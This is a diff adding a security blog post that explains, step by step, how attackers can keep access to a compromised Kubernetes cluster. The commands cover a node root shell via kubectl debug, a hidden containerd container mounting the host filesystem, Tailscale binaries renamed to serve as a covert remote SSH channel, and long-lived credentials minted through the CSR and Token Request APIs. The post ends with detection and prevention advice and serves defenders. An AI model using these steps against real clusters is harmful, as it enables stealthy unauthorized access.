@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Beyond the surface - Exploring attacker persistence strategies in Kubernetes</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://bsky.app/profile/mccune.org.uk">
+				<i class="fa fa-cloud"></i>
+			</a>	
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://raesene.github.io/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				Raesene's Ramblings
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
+				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
+				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="https://raesene.github.io/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://bsky.app/profile/mccune.org.uk">
+				<i class="fa fa-cloud fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Beyond the surface - Exploring attacker persistence strategies in Kubernetes </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   September 
+	   12th,
+	   
+	   2025
+	 </span>
+	  <div class="article_body">
+	  <p>I’ve been doing a talk on Kubernetes post-exploitation for a while now and one of requests has been for a blog post to refer back to, which I’m finally getting around to doing now!</p>
+
+<p>The goal of this talk is to lay out one attack path that attackers might use to retain and expand their access after an initial compromise of a Kubernetes cluster by getting access to an admin’s credentials. It doesn’t cover all the ways that attackers could do this, but provides one path and also hopefully illuminates some of the inner workings and default settings that attackers might exploit as part of their exploits.</p>
+
+<p>There’s a recording of a slightly earlier version of the talk <a href="https://youtu.be/4L8Dg_QSx30?si=Y4eit5EMmCBFOBQN">here</a> if you prefer videos, the flow is similar but I have simplified a bit for the latest iteration, thanks to <a href="https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/">debug profiles</a>! The general story the talk tells is one where attackers have temporary access to a cluster admin’s laptop where the admin has stepped away to take a call and not locked it, and they have to see how to get and keep access to the cluster before the admin comes back.</p>
+
+<h3 id="initial-access">Initial access</h3>
+
+<p>One of the first things an attacker might want to do with credentials is get a root shell on a Kubernetes cluster node as a good spot to look for credentials or plant binaries. With Kubernetes that’s very simple to do as there is functionality built in to the cluster to allow for users with the right levels of access to do that quickly via <code class="language-plaintext highlighter-rouge">kubectl debug</code></p>
+
+<p>A typical command might look like this (just replace the node name with one from your cluster)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl debug node/gke-demo-cluster-default-pool-04a13cdb-5p8d -it --profile=sysadmin --image=busybox
+</code></pre></div></div>
+
+<p>An important point from this command is the <code class="language-plaintext highlighter-rouge">--profile</code> switch as it dictates how much access you’ll have to the node. The <code class="language-plaintext highlighter-rouge">sysadmin</code> profile provides the highest level of access, so is the most useful for attackers.</p>
+
+<h3 id="executing-binaries">Executing Binaries</h3>
+
+<p>Once the attacker has shell access to a node, their next instinct is likely to download tools to run. This might not be as simple as it could be as many Kubernetes distributions lock down the Node OS, setting filesystems as read-only or <code class="language-plaintext highlighter-rouge">noexec</code>. However, all cluster nodes can do one thing… run containers. So if the attacker can download and run a container on the node, they’re likely to be able to run any programs they like!</p>
+
+<p>Doing this we can take a look at some lesser known features of Kubernetes clusters. In a cluster, all containers are run by a container runtime, typically <a href="https://containerd.io/">containerd</a> or <a href="https://cri-o.io/">CRI-O</a>, and it’s possible to talk directly to those programs if you’re on the node, bypassing the Kubernetes APIs altogether.</p>
+
+<p>In the talk I start by creating a new containerd namespace using the <code class="language-plaintext highlighter-rouge">ctr</code> tool. Ctr is very useful as it’s always installed (IME) alongside containerd, so you don’t need to get an external client program. We’re creating a containerd namespace to make it a bit harder for someone looking at the host to spot our container. Importantly containerd namespaces have nothing to do with Kubernetes namespaces, or Linux namespaces.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr namespace create sys_net_mon
+</code></pre></div></div>
+
+<p>We create a namespace called <code class="language-plaintext highlighter-rouge">sys_net_mon</code> just to make it a bit less obvious than “attackers were here”!. With the namespace created, the next step is to pull down a container image. The one I’m using is <code class="language-plaintext highlighter-rouge">docker.io/sysnetmon/systemd_net_mon:latest</code> . Importantly the contents of this container image have nothing to do with systemd or network monitoring! From a security standpoint it’s an important thing to remember that outside of the official or verified images, Docker Hub does no curation of image contents, so anyone can call their images anything!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr -n sys_net_mon images pull docker.io/sysnetmon/systemd_net_mon:latest
+</code></pre></div></div>
+
+<p>With the image pulled we can use <code class="language-plaintext highlighter-rouge">ctr</code> to start a container</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
+</code></pre></div></div>
+
+<p>This container provides us with full access to the hosts filesystem and also the host’s network interfaces which is pretty useful for post-exploitation activity. After that it’s just a question of getting a shell in the container.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
+</code></pre></div></div>
+
+<h3 id="static-manifests">Static Manifests</h3>
+
+<p>Another approach which the attackers could use to run a container on the node is static manifests. Most Kubelets will define a directory on the host which it will load static manifests from. These manifests run a pod without any API server necessary. A handy trick for our attackers is to give their static pod an invalid namespace name, as this prevents it being registered with the API server, so it won’t show up in <code class="language-plaintext highlighter-rouge">kubectl get pods -A</code> or similar. There’s more details on static pods and some of their security oddness on <a href="https://blog.iainsmart.co.uk/posts/2024-10-13-mirror-mirror/">Iain Smart’s blog</a></p>
+
+<h3 id="remote-access">Remote Access</h3>
+
+<p>The next problem our attackers have to tackle is retaining remote access to the environment after the admin returns to their laptop. Whilst there are a number of remote access programs available, a lot of the security/hacker related ones will be spotted by EDR/XDR style agents, so an alternative can be using something like <a href="https://tailscale.com/">Tailscale</a>!</p>
+
+<p>Tailscale has a number of features which are very useful for attackers (in addition to their normal usefulness!). First one is that it can be run with two statically compiled golang binaries that can be renamed. This means that you pick what will show up in the process list of the node. Following the theme of the container image, we use binaries <code class="language-plaintext highlighter-rouge">systemd_net_mon_server</code> and <code class="language-plaintext highlighter-rouge">systemd_net_mon_client</code></p>
+
+<p>The first command starts the server</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;
+</code></pre></div></div>
+<p>and then we start the client</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemd_net_mon_client up --ssh --hostname cafebot --auth-key=tskey-auth-XXXXX
+</code></pre></div></div>
+
+<p>In terms of network access this will run on only 443/TCP outbound if it uses Tailscale’s DERP network, so that access will probably be allowed in most environments. Also we can use Tailscale’s ACL feature so that our compromised container can’t communicate with any other machines on our Tailnet.</p>
+
+<p><img src="https://raesene.github.io/assets/media/Tailscale-bot-access-control.png" alt="Tailscale ACLs" /></p>
+
+<p>With those services running it should be possible to come back into the container over SSH. Tailscale bundles an SSH server with the program, no SSHD will show as running :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tailscale ssh root@cafebot
+</code></pre></div></div>
+
+<h3 id="credentials---kubelet-api">Credentials - Kubelet API</h3>
+
+<p>With remote access achieved, our attackers still need long lasting credentials and also it would be nice if they could probe the cluster without touching the Kubernetes API server, as that might show up in audit logs. So to do this they need access to credentials for a user who can talk to the Kubelet API directly. This runs on every node on 10250/TCP and has no auditing option available.</p>
+
+<p>In the talk to do this I use <a href="https://github.com/raesene/teisteanas/">teisteanas</a> which creates Kubeconfig based credentials for users using the Certificiate Signing Request (CSR) API. We can create a set of credentials for any user using this approach. For stealth an attacker would likely choose a user which already has rights assigned to it in RBAC, so they don’t have to create any new cluster roles or cluster role bindings. The exact user to use will vary, but in the demos from the talk I use <code class="language-plaintext highlighter-rouge">kube-apiserver</code> which is a user that exists in GKE clusters.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>teisteanas -username kube-apiserver -output-file kubelet-user.config
+</code></pre></div></div>
+
+<p>With that Kubeconfig file in hand and access to the Kubelet port on a host, it’s possible to take actions like listing pods on a node or executing commands in those pods. The easiest way to do this is to use <a href="https://github.com/cyberark/kubeletctl">kubeletctl</a>. So from our container which is running on the node, using the node’s network namespace, we can run something like this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubeletctl -s 127.0.0.1 -k kubelet-user.config pods
+</code></pre></div></div>
+
+<h3 id="csr-api">CSR API</h3>
+
+<p>It’s also important to understand a bit about the CSR API as, for attackers, it’s a useful thing to take advantage of. This API exists in pretty much every Kubernetes distribution and can be used to create credentials that authenticate to the cluster, apart from when using EKS as it does not allow that function. Very importantly credentials created via the CSR API can be abused by anyone who has access to the API server. Most managed Kubernetes distributions have chosen to have the Kubernetes API server exposed to the Internet by default, so an attacker who is able to get credentials for a cluster will be able to use them from anywhere in the world!</p>
+
+<p>The CSR API is also attractive to attackers for a number of reasons :-</p>
+
+<ul>
+  <li>Unless audit logging is enabled and correctly configured there is no record of the API having been used and the credentials having been created.</li>
+  <li>Credentials created by this API cannot be revoked without rotating the certificate authority for the whole cluster, which is a disruptive operation. The <a href="https://github.com/kubernetes/kubernetes/issues/18982">GitHub issue related to certificate revocation</a> has been open since 2015, so it’s likely this will not change now…</li>
+  <li>It’s possible to create credentials for generic system accounts, so even if the cluster operator has audit logging enabled, it could be difficult to identify malicious activity.</li>
+  <li>The credentials tend to be long lived. Whilst this is distribution dependent, generally this is 1-5 years.</li>
+</ul>
+
+<p>In the demos for the talk we’re running against a GKE cluster, so used the CSR API to generate credentials for the <code class="language-plaintext highlighter-rouge">system:gke-common-webhooks</code> user which has quite wide ranging privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>teisteanas -username system:gke-common-webhooks -output-file webhook.config
+</code></pre></div></div>
+
+<h3 id="token-request-api">Token Request API</h3>
+
+<p>Even if the CSR API isn’t available there’s another option built into Kubernetes that can create new credentials, which is the Token Request API. This is used by Kubernetes clusters to create service account tokens, but there’s nothing to stop an administrator who has the correct rights from using it. Similarly to the CSR API there’s no persistent record (apart from audit logs) that new credentials have been created, and they can be hard to revoke if a system level service account has been used, as the only way to revoke the credential is to delete it’s associated service account.</p>
+
+<p>The expiry may be less of a problem, depending on the Kubernetes distribution in use, it can vary from 24 hours maximum  to one year, from the managed distributions I’ve looked at.</p>
+
+<p>In the talk I use <a href="https://github.com/raesene/tocan/">tocan</a> to simplify the process of creating a Kubeconfig file from a service account token.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tocan -namespace kube-system -service-account clusterrole-aggregation-controller
+</code></pre></div></div>
+
+<p>The service account we clone is an interesting one as it has the “escalate” right, which means it can always become Cluster-admin even if it doesn’t have those rights to begin with. (I’ve written about <a href="https://raesene.github.io/blog/2020/12/12/Escalating_Away/">escalate</a> before)</p>
+
+<h3 id="detecting-these-attacks">Detecting these attacks</h3>
+
+<p>The talk closes by discussing how to detect and prevent these kind of attacks. For detection there’s a couple of key things to look at</p>
+
+<ul>
+  <li><strong>Kubernetes audit logs</strong> - This one is very important. You need to have audit logging enabled with centralized logs and good retention, to spot some of the techniques used here, especially abuse of the CSR and Token Request APIs</li>
+  <li><strong>Node Agents</strong> - Having security agents running on cluster nodes could allow for detection of things like the Tailscale traffic, depending on their configuration</li>
+  <li><strong>Node Logs</strong> - Generally ensuring that logs on nodes are properly centralized and stored is going to be important, as attackers can leave traces there.</li>
+  <li><strong>Know what good looks like</strong> - This one sounds simple but possibly isn’t. If you know what processes should be running on your cluster nodes, you can spot things like “systemd_net_mon” when they show up. What’s tricky here is that every distribution has a different set of management services run by the cloud provider, so it’s not a one off effort knowing what should be there.</li>
+</ul>
+
+<h3 id="preventing-these-attacks">Preventing these attacks</h3>
+
+<p>There are a couple of key ways cluster admins can reduce the risk of this scenario happening to them,</p>
+
+<ul>
+  <li><strong>Take your clusters off the Internet!!</strong> - Exposing the API server this way means you are one set of lost credentials away from a very bad day. Generally managed Kubernetes distributions will allow you to restrict access, but it’s not the default.</li>
+  <li><strong>Least Privilege</strong> - In this scenario, the compromised laptop had cluster-admin level privileges, enabling the attackers to move through the cluster easily. If the admin had been using an account with fewer privileges, the attacks might well not have succeeded. Whilst some of the rights used, like node debugging, are probably quite commonly used, others like the CSR API and Token Request API probably shouldn’t be needed in day-to-day administration, so could be restricted.</li>
+</ul>
+
+<p>To quote <a href="https://bsky.app/profile/lookitup.baby">Ian Coldwater</a></p>
+
+<p><img src="https://raesene.github.io/assets/media/made-of-stars.png" alt="Made of stars" /></p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>This talk just looks at one path that attackers could take to retain and expand their access to a cluster which they get access to. There are obviously other possibilities, but this can shed some light on some of the ways that Kubernetes works and how to improve your cluster security!</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="https://raesene.github.io/categories/index.html#Kubernetes-ref">
+					Kubernetes <span>(66)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+	<!--
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Beyond the surface - Exploring attacker persistence strategies in Kubernetes"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+	  -->		
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Kubernetes, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://raesene.github.io/blog/2025/08/21/bitnami-deprecation/" title="Bitnami Deprecation">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2025 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
+</body>
+</html>
+
+
